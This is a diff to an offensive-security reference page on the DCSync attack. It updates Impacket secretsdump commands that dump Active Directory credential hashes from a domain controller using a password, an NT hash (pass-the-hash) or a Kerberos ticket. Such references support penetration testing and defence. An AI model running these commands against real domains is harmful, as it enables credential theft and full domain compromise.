@@ -25,13 +25,13 @@ On UNIX-like systems, this attack can be carried out with [Impacket](https://git
 
 ```bash
 # using a plaintext password
-secretsdump -outputfile 'something' 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
+secretsdump -outputfile 'dcsync' -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 
 # with Pass-the-Hash
-secretsdump -outputfile 'something' -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
+secretsdump -outputfile 'dcsync' -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"@"$DC_HOST"
 
 # with Pass-the-Ticket
-secretsdump -k -outputfile 'something' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
+KRB5CCNAME=ticket.ccache secretsdump -k -no-pass -outputfile 'dcsync' -dc-ip "$DC_IP" @"$DC_HOST"
 ```
 
 The secretsdump script creates the following files.
